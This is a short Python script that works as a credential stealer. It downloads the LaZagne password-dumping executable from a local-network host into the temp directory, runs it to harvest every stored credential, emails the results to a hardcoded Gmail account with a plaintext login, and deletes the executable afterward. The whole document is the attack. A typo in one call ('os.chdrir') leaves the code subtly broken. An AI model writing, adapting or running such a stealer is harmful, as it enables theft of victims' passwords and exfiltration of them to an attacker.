import subprocess

import requests
import smtplib
import os
import tempfile
import subprocess


def download(url):
    get_response = requests.get(url)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.ehlo()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

temp_directory = tempfile.gettempdir()
os.chdrir(temp_directory)
download("http://10.0.2.16/my_files/LaZagne.exe")
result = subprocess.check_output("LaZagne.exe all", shell=True)
send_mail("obylywest777@gmail.com", "kmnalsbhq6@t#4ho", result)
os.remove("LaZagne.exe")
